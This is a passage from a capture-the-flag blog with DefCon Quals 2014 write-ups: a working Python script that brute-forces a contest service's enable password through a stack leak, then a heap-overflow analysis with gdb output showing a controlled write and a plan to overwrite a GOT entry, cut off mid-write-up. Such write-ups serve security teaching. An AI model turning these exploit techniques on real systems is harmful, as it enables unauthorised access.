<p>Notice in the following code, they do not null terminate the password. When the password is wrong, the printf will leak stack data. Fortunately for us, the result of the strcmp() will be leaked. That will allow us to brute force the password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">do_enable</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a1</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx@2</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">user_password</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [sp+18h] [bp-34h]@2</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">bMatch</span><span class="p">;</span> <span class="c1">// [sp+38h] [bp-14h]@3</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-10h]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">a1</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">v1</span> <span class="o">=</span> <span class="n">user_password</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strncpy</span><span class="p">(</span><span class="n">user_password</span><span class="p">,</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="mi">32u</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">v1</span> <span class="o">=</span> <span class="n">user_password</span><span class="p">;</span>
</span><span class='line'>    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Please enter a password: &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>    <span class="n">get_password_from_user</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">user_password</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">bMatch</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">g_enable_password</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">bMatch</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Nope.  The password isn&#39;t %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">g_enable_mode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">g_prompt</span> <span class="o">=</span> <span class="sc">&#39;#&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Authentication Successful&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">sub_8049090</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">get_password_from_user</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="n">delim</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">count</span><span class="p">;</span> <span class="c1">// ebx@1</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">byte_read</span><span class="p">;</span> <span class="c1">// [sp+1Fh] [bp-1Dh]@3</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_read</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">byte_read</span> <span class="o">!=</span> <span class="n">delim</span> <span class="p">)</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>        <span class="n">dest</span><span class="p">[</span><span class="n">count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">byte_read</span><span class="p">;</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">!=</span> <span class="n">size</span> <span class="p">)</span>
</span><span class='line'>          <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">count</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Code</h2>

<p>The result of strcmp() will either be 1 or -1, depending on whether s1 or s2 is
bigger. By filling the buffer will &#8216;\x01&#8217;, and guessing one character at a time
from high to low, we will be able to determine the actual character when the leaked data byte changes.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="o">=</span><span class="s">&#39;$&#39;</span><span class="p">):</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="n">delim</span><span class="p">:</span>
</span><span class='line'>      <span class="k">break</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">+=</span> <span class="n">b</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">try</em>enable</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span><span class='line'>  <span class="n">guess</span> <span class="o">=</span> <span class="mi">128</span>
</span><span class='line'>  <span class="k">while</span> <span class="n">guess</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;enable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;:&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">31</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">))</span><span class="o">*</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># find the first transition in which our guess</span>
</span><span class='line'>    <span class="c"># is not higher than the target</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">read</em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="s">&#39;</span><span class="se">\xff</span><span class="s">&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">password</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;enable &quot;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">))</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">password</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">-=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;shitsco</em>c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'><span class="c"># skip banner</span>
</span><span class='line'><span class="n">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>  <span class="n">password</span> <span class="o">=</span> <span class="n">try</em>enable</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">password</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">enable </span>bruT3m3hard3rb4by
</span><span class='line'>Authentication Successful
</span><span class='line'><span class="c"># ?</span>
</span><span class='line'><span class="o">==========</span>Available <span class="nv">Commands</span><span class="o">==========</span>
</span><span class='line'>|enable                               |
</span><span class='line'>|ping                                 |
</span><span class='line'>|tracert                              |
</span><span class='line'>|?                                    |
</span><span class='line'>|flag                                 |
</span><span class='line'>|shell                                |
</span><span class='line'>|set                                  |
</span><span class='line'>|show                                 |
</span><span class='line'>|credits                              |
</span><span class='line'>|quit                                 |
</span><span class='line'>|disable                              |
</span><span class='line'><span class="o">======================================</span>
</span><span class='line'>Type ? followed by a <span class="nb">command </span><span class="k">for </span>more detailed information
</span><span class='line'><span class="c"># flag</span>
</span><span class='line'>The flag is: Dinosaur vaginas
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefCon Quals 2014 - babysfirst heap]]></title>
    <link href="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/"/>
    <updated>2014-05-23T13:27:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap</id>
    <content type="html"><![CDATA[<h2>Analysis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to your first heap overflow...
</span><span class='line'>I am going to allocate 20 objects...
</span><span class='line'>Using Dougle Lee Allocator 2.6.1...
</span><span class='line'>Goodluck!
</span><span class='line'>
</span><span class='line'>Exit function pointer is at 804C8AC address.
</span><span class='line'>[ALLOC][loc=8ED2008][size=1246]
</span><span class='line'>[ALLOC][loc=8ED24F0][size=1121]
</span><span class='line'>[ALLOC][loc=8ED2958][size=947]
</span><span class='line'>[ALLOC][loc=8ED2D10][size=741]
</span><span class='line'>[ALLOC][loc=8ED3000][size=706]
</span><span class='line'>[ALLOC][loc=8ED32C8][size=819]
</span><span class='line'>[ALLOC][loc=8ED3600][size=673]
</span><span class='line'>[ALLOC][loc=8ED38A8][size=1004]
</span><span class='line'>[ALLOC][loc=8ED3C98][size=952]
</span><span class='line'>[ALLOC][loc=8ED4058][size=755]
</span><span class='line'>[ALLOC][loc=8ED4350][size=260]
</span><span class='line'>[ALLOC][loc=8ED4458][size=877]
</span><span class='line'>[ALLOC][loc=8ED47D0][size=1245]
</span><span class='line'>[ALLOC][loc=8ED4CB8][size=1047]
</span><span class='line'>[ALLOC][loc=8ED50D8][size=1152]
</span><span class='line'>[ALLOC][loc=8ED5560][size=1047]
</span><span class='line'>[ALLOC][loc=8ED5980][size=1059]
</span><span class='line'>[ALLOC][loc=8ED5DA8][size=906]
</span><span class='line'>[ALLOC][loc=8ED6138][size=879]
</span><span class='line'>[ALLOC][loc=8ED64B0][size=823]
</span><span class='line'>Write to object [size=260]:
</span><span class='line'>Copied 16 bytes.
</span><span class='line'>[FREE][address=8ED2008]
</span><span class='line'>[FREE][address=8ED24F0]
</span><span class='line'>[FREE][address=8ED2958]
</span><span class='line'>[FREE][address=8ED2D10]
</span><span class='line'>[FREE][address=8ED3000]
</span><span class='line'>[FREE][address=8ED32C8]
</span><span class='line'>[FREE][address=8ED3600]
</span><span class='line'>[FREE][address=8ED38A8]
</span><span class='line'>[FREE][address=8ED3C98]
</span><span class='line'>[FREE][address=8ED4058]
</span><span class='line'>[FREE][address=8ED4350]
</span><span class='line'>[FREE][address=8ED4458]
</span><span class='line'>[FREE][address=8ED47D0]
</span><span class='line'>[FREE][address=8ED4CB8]
</span><span class='line'>[FREE][address=8ED50D8]
</span><span class='line'>[FREE][address=8ED5560]
</span><span class='line'>[FREE][address=8ED5980]
</span><span class='line'>[FREE][address=8ED5DA8]
</span><span class='line'>[FREE][address=8ED6138]
</span><span class='line'>[FREE][address=8ED64B0]
</span><span class='line'>Did you forget to read the flag with your shellcode?
</span><span class='line'>Exiting</span></code></pre></td></tr></table></div></figure>

<p>Presumably a heap overflow. It appears as if we are going to write to the buffer that is allocated for 260 bytes, and presumably can overwrite into the next heap buffer. Looking at the addresses and sizes provided, all of the buffers are bumped up against one another. An uncontrolled write will allow us to overwrite heap metadata of another block, which when freed will attempt to unlink and coalesce. Let&#8217;s play around with the inputs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;AAAABBBB&quot;+&quot;C&quot;*252+&quot;\x00\x00\x00\x00&quot;&#39;</span> &gt; input
</span><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>gdb babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run &lt; input
</span><span class='line'>Welcome to your first heap overflow...
</span><span class='line'>I am going to allocate 20 objects...
</span><span class='line'>Using Dougle Lee Allocator 2.6.1...
</span><span class='line'>Goodluck!
</span><span class='line'>
</span><span class='line'>Exit <span class="k">function </span>pointer is at 804C8AC address.
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D008<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1246<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D4F0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1121<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D958<span class="o">][</span><span class="nv">size</span><span class="o">=</span>947<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804DD10<span class="o">][</span><span class="nv">size</span><span class="o">=</span>741<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E000<span class="o">][</span><span class="nv">size</span><span class="o">=</span>706<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E2C8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>819<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E600<span class="o">][</span><span class="nv">size</span><span class="o">=</span>673<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E8A8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1004<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804EC98<span class="o">][</span><span class="nv">size</span><span class="o">=</span>952<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F058<span class="o">][</span><span class="nv">size</span><span class="o">=</span>755<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F350<span class="o">][</span><span class="nv">size</span><span class="o">=</span>260<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F458<span class="o">][</span><span class="nv">size</span><span class="o">=</span>877<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F7D0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1245<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804FCB8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1047<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>80500D8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1152<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050560<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1047<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050980<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1059<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050DA8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>906<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8051138<span class="o">][</span><span class="nv">size</span><span class="o">=</span>879<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>80514B0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>823<span class="o">]</span>
</span><span class='line'>Write to object <span class="o">[</span><span class="nv">size</span><span class="o">=</span>260<span class="o">]</span>:
</span><span class='line'>Copied 265 bytes.
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D008<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D4F0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D958<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804DD10<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E000<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E2C8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E600<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E8A8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804EC98<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804F058<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x080493f6 in free <span class="o">(</span><span class="nv">mem</span><span class="o">=</span>0x804f058<span class="o">)</span> at malloc.c:1259
</span><span class='line'>1259    in malloc.c
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /i <span class="nv">$eip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x80493f6 &lt;free+273&gt;:   mov    %edx,0x8<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info reg
</span><span class='line'>eax            0x41414141   1094795585
</span><span class='line'>ecx            0x804d004    134533124
</span><span class='line'>edx            0x42424242   1111638594
</span></code></pre></td></tr></table></div></figure>

<p>There&#8217;s a controlled 4-byte write. In order to gain execution, we can overwrite
the GOT (targeting printf(), which is repeatedly called in between freeing
buffers) or target the do_exit() function pointer which they provide to us.</p>

<p>Let&#8217;s target printf():
